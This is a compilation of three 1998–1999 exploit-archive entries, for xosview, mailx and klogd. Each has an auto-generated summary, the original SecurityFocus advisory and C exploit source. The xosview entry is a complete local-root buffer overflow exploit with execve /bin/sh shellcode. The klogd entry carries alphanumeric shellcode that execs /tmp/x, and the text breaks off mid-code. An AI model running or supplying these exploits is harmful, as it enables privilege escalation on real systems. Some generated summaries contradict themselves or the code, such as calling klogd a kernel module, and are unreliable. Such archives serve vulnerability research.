// #<-- Publish Date --># // 1999-05-28 // #<-- Technical Document Summary (TDS) --># // The exploit leverages a buffer overflow in the Xrm.cc component of xosview by writing beyond the allocated buffer using an environment variable (HOME) that is insufficiently validated. This allows arbitrary code execution after setting the HOME environment variable, enabling local root access on RedHat Linux 5.1. The vulnerability stems from improper size checking when copying data from the user-controlled input into a fixed-size buffer. // #<-- Layman's Document Summary (LDS) --># // An attacker can inject malicious data through the HOME environment variable to overflow a buffer in the X11 monitoring application, leading to arbitrary code execution and root privileges on the system. This is a classic buffer overflow that permits privilege escalation without authentication. // #<-- Key Words (KW) --># // xosview, RedHat Linux 5.1, buffer overflow, setuid root, HOME environment variable, shellcode injection, local root access, X11 monitoring application, getenv function, malloc allocation failure // #<-- Related Terms --># // buffer overflow, privilege escalation, setuid binary, exploit, RedHat Linux, X11, vulnerability classification, CVE-1999-1490, OSVDB-7393 // #<-- Entities/Attributes --># // Software: xosview, RedHat Linux 5.1; Function: get_sp, main, strcpy, setenv; Variable: HOME; Buffer: DEFAULT_OFFSET, DEFAULT_BUFFER_SIZE; Protocol: X11, system call /usr/bin/X11/xosview // #<-- Vulnerability Type --># // Buffer overflow // #<-- Original Content --># // source: https://www.securityfocus.com/bid/362/info xosview is an X11 system monitoring application that ships with RedHat 5.1 installed setuid root. A buffer overflow vulnerability was found in Xrm.cc, the offending code listed below: char userrfilename[1024]; strcpy(userrfilename, getenv("HOME")); The userfilename can be overflowed and arbritrary code executed to gain root access locally. * xosview 1.5.1 buffer overrun exploit * brought to you by Kossak (ldvg@rnl.ist.utl.pt) * * yep, this is a shameless rip from Aleph's tutorials, but it sure * works... Lets keep those exploits coming!! :) * Thanks to Chris Evans for posting the bug. */ /* NOTE!!! xosview needs an open X display for this to work, so remember * to modify the source (line 62), with your ip. * The offset and buffer size work with me fine, but you might need to * change them. */ #include <stdlib.h> #define DEFAULT_OFFSET 1150 #define DEFAULT_BUFFER_SIZE 3500 #define NOP 0x90 char shellcode[] = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" "\x80\xe8\xdc\xff\xff\xff/bin/sh"; unsigned long get_sp(void) { __asm__("movl %esp,%eax"); } void main(int argc, char *argv[]) { char *buff, *ptr; long *addr_ptr, addr; int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE; int i; if (!(buff = malloc(bsize))) { printf("Can't allocate memory.
"); exit(0); } addr = get_sp() - offset; printf("xosview exploit by Kossak
"); printf("try changing the default values if you dont get root now.
"); printf("Using address: 0x%x
", addr); ptr = buff; addr_ptr = (long *) ptr; for (i = 0; i < bsize; i+=4) *(addr_ptr++) = addr; for (i = 0; i < bsize/2; i++) buff[i] = NOP; ptr = buff + ((bsize/2) - (strlen(shellcode)/2)); for (i = 0; i < strlen(shellcode); i++) *(ptr++) = shellcode[i]; buff[bsize - 1] = '\0'; setenv("HOME", buff, 1); system("/usr/bin/X11/xosview -display 0:0"); /* your IP here */ }

// #<-- Publish Date --># // 1998-06-25 // #<-- Technical Document Summary (TDS) --># // A buffer overrun exists in the /bin/mailx program due to improper validation of the username argument. The vulnerability allows arbitrary code execution by supplying a sufficiently long input string. This weakness enables an attacker to write malicious code into memory and execute it with the privileges of the mailx process. The affected component is the mailx utility on RedHat Linux 4.2, SGI IRIX 6.3, and Solaris 2.6 systems. // #<-- Layman's Document Summary (LDS) --># // The weakness is a classic buffer overflow caused by insufficient input length checking in the username parameter. An attacker can execute code as the group 'mail' user on certain Unix-like systems. This allows an attacker to run arbitrary commands without authentication. // #<-- Key Words (KW) --># // mailx, buffer overflow, RedHat Linux 4.2, SGI IRIX 6.3, Solaris 2.6, arbitrary code execution, UNIX buffer overflow, input validation, command injection // #<-- Related Terms --># // buffer overflow, privilege escalation, local vulnerability, mailx, RedHat Linux, SGI IRIX, Solaris, CVE-1999-0125 // #<-- Entities/Attributes --># // Software: mailx // Program: /bin/mailx // Versions: RedHat Linux 4.2, SGI IRIX 6.3, Solaris 2.6 // Vulnerability ID: CVE-1999-0125 // Operating System: Linux, Solaris // Architecture: Unix-like // Functions: open, read, write // File paths: /bin/mailx // Protocol: local // #<-- Vulnerability Type --># // Buffer overflow // Not specified in source // #<-- Original Content --># // source: https://www.securityfocus.com/bid/393/info A buffer overrun exists in the /bin/mailx program. This program was originally developed as part of BSD, and is available on many Unix systems. By supplying a long, well crafted buffer as the username argument, an attacker can use it to execuate arbitrary code. On some systems, this will result in the ability to execute code as group mail. // this is nothing special, it allows you to read files that are // readable by the group 'mail'. // feedback: segv <dan@rtfm.net> #include <stdio.h> #include <unistd.h> #include <stdlib.h> #include <string.h> #include <sys/types.h> #include <sys/stat.h> #include <fcntl.h> void usage(char *prog); void main(int argc, char *argv[]) { char buffer[1024]; int fd, bytes; if(argc != 3) usage(argv[0]); if((strcmp(argv[1],"-c"))) usage(argv[0]); else { if((fd=open(argv[2],O_RDONLY)) == -1) { perror("open"); exit(1); } while((bytes=read(fd,buffer,sizeof(buffer))) > 0) write(1,buffer,bytes); close(fd); } exit(0); } void usage(char *prog) { fprintf(stderr,"this program should be invoked by mailx
"); fprintf(stderr,"remember to set the env var 'SHELL' to the
"); fprintf(stderr,"name of this program.
"); exit(1); }

// #<-- Publish Date --># // 1999-02-26 // #<-- Technical Document Summary (TDS) --># // The exploit leverages a buffer overflow in the klogd kernel module to cause denial of service by generating malformed kernel messages. It exploits an unchecked user input within the printk() function that is later processed without proper validation, allowing arbitrary code execution via shellcode injection. Affected component: Linux kernel's klogd handling of kernel messages; vulnerability type: buffer overflow. No successful exploitation is demonstrated in the source. // #<-- Layman's Document Summary (LDS) --># // This flaw occurs when generating old or obscure kernel messages that lack a terminating newline character, leading to a crash or denial of service. An attacker can achieve local root access by injecting shellcode into printk() messages through user-controlled variables like filenames. The issue was fixed in RedHat and Slackware Linux but remains unpatched on other distributions. // #<-- Key Words (KW) --># // technical document summary, buffer overflow vulnerability, denial of service, klogd, kernel message handling, exploit via shellcode injection, local root access, RedHat Linux, Slackware Linux, not specified in source. // #<-- Related Terms --># // buffer overflow, denial of service, printk, environment variable injection, shellcode execution, local privilege escalation, Linux kernel, RedHat, Slackware, exploit via user input, OS vulnerability. // #<-- Entities/Attributes --># // Software: klogd, Linux kernel, RedHat, Slackware, C, Assembly; Vulnerability type: buffer overflow; CVE identifiers: Not specified in source. // #<-- Vulnerability Type --># // Not specified in source. // #<-- Original Content --># // source: https://www.securityfocus.com/bid/398/info It is possible to cause a denial of service (remote and local) through generating old, obscure kernel messages (not terminated with 
) in klogd. The problem exists because of a buffer overflow in the klogd handling of kernel messages. It is possible to gain local root access through stuffing shellcode into printk() messages which contain user-controllable variables (eg, filenames). What makes this problem strange, however, is that it was fixed two years ago. Two of the most mainstream linux distributions (Slackware Linux and RedHat Linux), up until recently, are known to have been shipping with the very old vulnerable version. Fixes and updates were released promptly. There is no data on other distributions. /* * Linux/x86 klogd exploit using envcheck by * Esa Etelavuori (www.iki.fi/ee/) in 2k0912 * Tested on Red Hat 6.2 / Celeron A & P2. * You need some skillz to use this. */ #include <stdio.h> #include <stdlib.h> #include <unistd.h> #define RETADDR 0xbffffdab int main(int ac, char **av) { char sting[] = "./[<%2009xAAAABBB"; /* Self-modifying code using 0x20 - 0x7e chars and execing /tmp/x. * May need tuning for correct %esp offset (%ebx) for modification * of last two bytes which are transformed into int 0x80. */ char *venom = "LC_ALL=" "T[fhBOfXf5B@f1ChjAX4APPZHf1Chfh/xh/tmpT[RSTYjOX4D2p"; if (ac != 1 && ac != 2) { fprintf(stderr, "usage: %s [return address]
", av[0]); exit(1); } if (ac == 2 && av[1][0] == '-') { printf("done
"); exit(0); } else if (ac == 2 && av[1][0] == '+') { if (putenv(venom)) { perror("putenv");

